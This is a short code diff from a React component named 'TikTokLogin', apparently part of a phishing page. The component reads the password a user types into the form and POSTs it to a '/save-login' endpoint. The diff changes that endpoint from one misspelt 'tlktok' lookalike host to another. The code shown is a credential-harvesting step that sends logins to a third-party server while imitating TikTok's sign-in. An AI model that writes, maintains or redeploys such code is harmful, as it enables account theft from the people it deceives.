@@ -16,7 +16,7 @@ export default function TikTokLogin() {
     const password = e.target[1].value;
 
     try {
-      await fetch("https://tlktok.onrender.com/save-login", {
+      await fetch("https://tlktok-peach.vercel.app/save-login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
